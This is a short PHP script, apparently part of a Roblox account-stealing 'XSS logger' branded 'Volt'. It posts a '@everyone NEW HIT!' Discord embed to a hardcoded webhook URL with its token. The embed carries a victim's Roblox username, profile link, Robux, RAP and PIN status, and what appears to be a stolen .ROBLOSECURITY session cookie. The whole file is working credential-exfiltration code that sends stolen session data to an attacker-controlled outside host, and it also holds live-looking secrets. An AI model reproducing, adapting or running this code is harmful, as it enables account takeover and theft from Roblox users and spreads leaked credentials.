<?php
//=======================================================================================================
// Create new webhook in your Discord channel settings and copy&paste URL
//=======================================================================================================

$webhookurl = "https://discord.com/api/webhooks/896065421608902747/Iq8egp7EhCuapqcWPb3jOw0gsxkdE_ICJ_NYPNO9GjQrk8urRdx1ZDwmNGFk9GGA10Le";

//=======================================================================================================
// Compose message. You can use Markdown
// Message Formatting -- https://discordapp.com/developers/docs/reference#message-formatting
//========================================================================================================

$timestamp = date("c", strtotime("now"));

$json_data = json_encode([
    // Message
    "content" => "@everyone NEW HIT!",
    
    // Username
    "username" => "volt logger$",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    //"avatar_url" => "https://media.discordapp.net/attachments/896065404991057960/896084571022569532/5b934705e90bd1b9fd65449f7ebf0900.gif,

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "Xss Logger - Volt",

            // Embed Type
            "type" => "rich",

            // Embed Description
            "description" => "**Username** :
[**voltgottaglock**](<https://www.roblox.com/users/2215939784/profile>)
**Rap :**ㅤㅤㅤㅤㅤㅤㅤㅤ**Robux :** ㅤㅤㅤㅤㅤㅤㅤ**Credit :**
89,023 ㅤㅤㅤㅤㅤㅤㅤ625ㅤㅤㅤㅤㅤㅤㅤㅤㅤ$0.00ㅤㅤㅤㅤㅤ
**Premium :**ㅤㅤㅤㅤㅤㅤ**Status :** ㅤㅤㅤㅤㅤㅤㅤ**Pin :**
True ㅤㅤㅤㅤㅤㅤㅤㅤㅤVerifiedㅤㅤㅤㅤㅤㅤㅤTrueㅤㅤㅤㅤㅤ
```_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_FDCDCF1BB67A5F7E8F97C770BD76EFE72CF2FCF47B29C80408804DD8A1C701C665CE829022868F8BBC45EB25D05D9F3171E8746F046A41F6AC8D8A24DDCFF4E4EDE8D057DC429E8DDDA282AC6E967D7DD7A6068E9B54E9195A236F87C7C190737C2C49B04940CE79B889B77CA8A292D8F031A8276603FCDA1B6005A06C114A0393F52955A3F780B5AF351673E36248204C642934C180FB552604EAAD70021B767076757B401F5A48640D020F4DBABA1273E0F828F4BE86146F60558B42E29C4DBE336DA499598B86FDB58224E2E1D7C249123ADB296DC7F63F264CFABBF34CABB467647FF6BABADBF817FA15C74678EB23D700028915CBDAD6676498C47E83933A79151660DAD94FD09C02331C816F5ED9FB267F42E2CA7622F8180DD91A006EBAF329421BDA33D732AB50DFE01CDD6675A044DEE42D089BC414BA7F979B325792D6D6C7C0D8FD368BAC52972BE20C494C81A28D```",

            // URL of title link
            "url" => "https://gist.github.com/Mo45/cb0813cb8a6ebcd6524f6a36d4f8862c",

            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "3366ff" ),

            // Footer
            "footer" => [
                "text" => "Made By Volt#0007",
                "icon_url" => "https://tr.rbxcdn.com/1225a6c8d950c3e572996740e2b79c6c/352/352/Avatar/Png"
            ],

            // Image to send
            "image" => [
                "url" => ""
            ],

            // Thumbnail
            //"thumbnail" => [
            //    "url" => "https://tr.rbxcdn.com/1225a6c8d950c3e572996740e2b79c6c/352/352/Avatar/Png"
            //],

            // Author
            "author" => [
                "name" => "",
                "url" => ""
            ],
                ]
                // Etc..
            ]
        ]
    

, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );
